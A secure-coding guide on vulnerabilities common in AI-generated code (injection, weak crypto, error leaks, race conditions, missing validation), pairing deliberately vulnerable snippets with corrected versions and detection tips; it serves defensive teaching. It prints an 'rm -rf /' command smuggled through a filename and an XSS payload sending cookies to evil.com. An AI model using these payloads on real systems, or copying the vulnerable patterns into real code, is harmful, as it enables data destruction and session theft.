# AI-Generated Code Risks

> AI-generated code often *looks* correct but harbors subtle vulnerabilities — know the patterns so you can catch them before production.

---

## Why AI Code Is Uniquely Risky

AI models generate code that is **syntactically correct** and **plausible-looking**, which makes it more dangerous than obviously broken code. Developers trust it because it compiles, passes linting, and reads well. But AI models learn from the entire internet — including insecure Stack Overflow answers, outdated tutorials, and vulnerable open-source code.

The core issue: **AI optimizes for "looks right" rather than "is secure."**

---

## Vulnerability Frequency by Category

| Category | Frequency in AI Output | Severity | Ease of Detection |
|----------|----------------------|----------|-------------------|
| Injection flaws (SQL, command, XSS) | 🔴 Very common | Critical | Medium — SAST catches most |
| Input validation gaps | 🔴 Very common | High | Hard — requires domain knowledge |
| Error handling leaks | 🟠 Common | Medium | Easy — pattern matching |
| Authentication/authorization gaps | 🟠 Common | Critical | Hard — requires architecture review |
| Cryptographic misuse | 🟡 Moderate | Critical | Medium — known bad patterns |
| Race conditions | 🟡 Moderate | High | Hard — requires concurrency analysis |

---

## 1. Injection Flaws

AI routinely generates string-concatenated queries and unsanitized shell commands. It's 2025 — we should know not to pass arbitrary unescaped strings — but AI models keep reproducing these patterns from training data.

### SQL Injection

```python
# ❌ AI-generated — vulnerable to SQL injection
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

# Input: ' OR '1'='1' --
# Becomes: SELECT * FROM users WHERE username = '' OR '1'='1' --'
```

```python
# ✅ Corrected — parameterized query
def get_user(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    return cursor.fetchone()
```

### Command Injection

```python
# ❌ AI-generated — shell injection via os.system()
import os

def convert_file(filename):
    os.system(f"convert {filename} output.pdf")

# Input: "file.txt; rm -rf /"
# Executes: convert file.txt; rm -rf / output.pdf
```

```python
# ✅ Corrected — use subprocess with argument list
import subprocess

def convert_file(filename):
    subprocess.run(["convert", filename, "output.pdf"], check=True)
```

### Cross-Site Scripting (XSS)

```javascript
// ❌ AI-generated — XSS via innerHTML
function displayUserComment(comment) {
  document.getElementById('comments').innerHTML += `
    <div class="comment">${comment}</div>
  `;
}
// Input: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

```javascript
// ✅ Corrected — use textContent or sanitize
function displayUserComment(comment) {
  const div = document.createElement('div');
  div.className = 'comment';
  div.textContent = comment;
  document.getElementById('comments').appendChild(div);
}
```

**How to detect:** Static analysis tools (ESLint security plugins, Bandit, Semgrep) flag string concatenation in query contexts and `innerHTML` usage. Search for `os.system`, `eval(`, `innerHTML`, and string interpolation near `execute(`.

---

## 2. Authentication and Authorization Gaps

AI generates "happy path" authentication — it implements login but skips the security layers that protect it.

```python
# ❌ AI-generated — login without rate limiting, CSRF, or session management
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    user = db.find_user(username)
    if user and user.password == password:  # Plain-text comparison!
        return jsonify({"token": generate_token(user.id)})
    return jsonify({"error": "Invalid credentials"}), 401
```

```python
# ✅ Corrected — with rate limiting, password hashing, CSRF protection
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_wtf.csrf import CSRFProtect
from werkzeug.security import check_password_hash
import secrets

app = Flask(__name__)
csrf = CSRFProtect(app)
limiter = Limiter(app, default_limits=["5 per minute"])

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    if not username or not password:
        return jsonify({"error": "Missing credentials"}), 400

    user = db.find_user(username)
    # Constant-time comparison to prevent timing attacks
    if user and check_password_hash(user.password_hash, password):
        session_token = secrets.token_urlsafe(32)
        store_session(user.id, session_token, ttl=3600)
        return jsonify({"token": session_token})

    return jsonify({"error": "Invalid credentials"}), 401
```

**What AI typically misses:**

- Rate limiting on login endpoints
- CSRF protection on state-changing operations
- Password hashing (stores or compares plain text)
- Session expiry and rotation
- Account lockout after failed attempts

**How to detect:** Review all authentication routes manually. Check for the presence of rate limiting middleware, CSRF tokens, and hashed password comparisons.

---

## 3. Cryptographic Misuse

AI frequently uses weak or outdated cryptographic methods because its training data includes decades of tutorials with bad practices.

```python
# ❌ AI-generated — MD5 hashing, hardcoded key, weak random
import hashlib
import random

SECRET_KEY = "my-secret-key-123"

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

def generate_token():
    return str(random.randint(100000, 999999))
```

```python
# ✅ Corrected — bcrypt, environment variable, cryptographic random
import bcrypt
import secrets
import os

SECRET_KEY = os.environ["SECRET_KEY"]

def hash_password(password):
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())

def generate_token():
    return secrets.token_urlsafe(32)
```

**Common AI cryptographic mistakes:**

| Mistake | Why It's Wrong | Correct Approach |
|---------|---------------|------------------|
| MD5/SHA1 for passwords | Fast to brute-force | bcrypt, scrypt, or Argon2 |
| Hardcoded secret keys | Committed to git, visible in code | Environment variables or secret managers |
| `random.randint()` for tokens | Predictable PRNG | `secrets` module or `/dev/urandom` |
| ECB mode encryption | Patterns visible in ciphertext | GCM or CBC with proper IV |
| No salt in password hashing | Rainbow table attacks | Always salt; bcrypt does this automatically |

**How to detect:** Grep for `md5`, `sha1` near password contexts, `random.` in security contexts, hardcoded strings assigned to variables named `key`, `secret`, or `token`.

---

## 4. Error Handling Leaks

AI generates verbose error handling that's great for debugging but terrible for production — exposing stack traces, database schemas, and internal paths.

```javascript
// ❌ AI-generated — leaks internal details
app.get('/api/user/:id', async (req, res) => {
  try {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
    res.json(user);
  } catch (error) {
    res.status(500).json({
      error: error.message,
      stack: error.stack,
      query: error.query
    });
  }
});
```

```javascript
// ✅ Corrected — log internally, return generic message
app.get('/api/user/:id', async (req, res) => {
  try {
    const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
    res.json(user);
  } catch (error) {
    logger.error('User fetch failed', {
      userId: req.params.id,
      error: error.message,
      stack: error.stack
    });
    res.status(500).json({ error: 'An internal error occurred' });
  }
});
```

**How to detect:** Search for `error.stack`, `error.message`, or `traceback` being returned in HTTP responses. Check that error responses don't include database details, file paths, or stack traces.

---

## 5. Race Conditions

AI generates code that works perfectly in single-threaded testing but breaks under concurrency — because it doesn't consider concurrent access.

```python
# ❌ AI-generated — race condition in balance check
def transfer_money(from_account, to_account, amount):
    sender = get_account(from_account)
    if sender.balance >= amount:  # Check
        sender.balance -= amount  # Act
        receiver = get_account(to_account)
        receiver.balance += amount
        save_account(sender)
        save_account(receiver)
        return True
    return False
# Two concurrent transfers can both pass the balance check
```

```python
# ✅ Corrected — database-level locking
def transfer_money(from_account, to_account, amount):
    with db.transaction():
        sender = db.query(
            "SELECT * FROM accounts WHERE id = %s FOR UPDATE",
            (from_account,)
        )
        if sender.balance >= amount:
            db.execute(
                "UPDATE accounts SET balance = balance - %s WHERE id = %s",
                (amount, from_account)
            )
            db.execute(
                "UPDATE accounts SET balance = balance + %s WHERE id = %s",
                (amount, to_account)
            )
            return True
    return False
```

**How to detect:** Look for read-then-write patterns without transactions or locks. Any code that checks a value and then modifies it in separate steps is a candidate for race conditions.

---

## 6. Input Validation Gaps

AI assumes inputs arrive in the expected format — it doesn't defend against malformed, oversized, or malicious data.

```typescript
// ❌ AI-generated — no validation
app.post('/api/users', async (req, res) => {
  const user = await db.createUser({
    name: req.body.name,
    email: req.body.email,
    age: req.body.age,
    role: req.body.role  // User can set their own role!
  });
  res.json(user);
});
```

```typescript
// ✅ Corrected — input validation and sanitization
import { z } from 'zod';

const CreateUserSchema = z.object({
  name: z.string().min(1).max(100).trim(),
  email: z.string().email().max(255),
  age: z.number().int().min(13).max(150),
  // role is NOT accepted from input — set server-side
});

app.post('/api/users', async (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid input', details: result.error.issues });
  }

  const user = await db.createUser({
    ...result.data,
    role: 'user'  // Always set server-side
  });
  res.json(user);
});
```

**Common validation gaps in AI code:**

- Missing type checks (expecting number, getting string)
- No length limits on strings (DoS via huge payloads)
- Accepting user-supplied roles, permissions, or IDs that should be server-controlled
- No email/URL format validation
- Missing boundary checks on numeric inputs

**How to detect:** Search for direct `req.body`, `req.params`, or `req.query` usage without validation middleware. Check if any user input flows directly into database operations or privilege assignments.

---

## Defense in Depth Strategy

No single measure catches everything. Layer your defenses:

```
AI generates code
    → Static analysis catches injection patterns (automated)
    → Pre-commit hooks catch secrets (automated)
    → Code review catches logic errors (human)
    → Integration tests catch runtime failures (automated)
    → Security scanning catches known vulnerabilities (automated)
```

---

## Quick Detection Reference

| Vulnerability | Search Pattern | Tool |
|--------------|---------------|------|
| SQL injection | `f"SELECT`, `f"INSERT`, `+ "SELECT` | Semgrep, Bandit |
| Command injection | `os.system(`, `subprocess.call(.*shell=True` | Bandit, Semgrep |
| XSS | `innerHTML`, `dangerouslySetInnerHTML`, `v-html` | ESLint, Semgrep |
| Hardcoded secrets | `password = "`, `api_key = "`, `SECRET_KEY = "` | detect-secrets, git-secrets |
| Weak crypto | `hashlib.md5`, `hashlib.sha1`, `random.` | Bandit, Semgrep |
| Error leaks | `error.stack`, `traceback.format_exc()` in responses | Manual review, Semgrep |
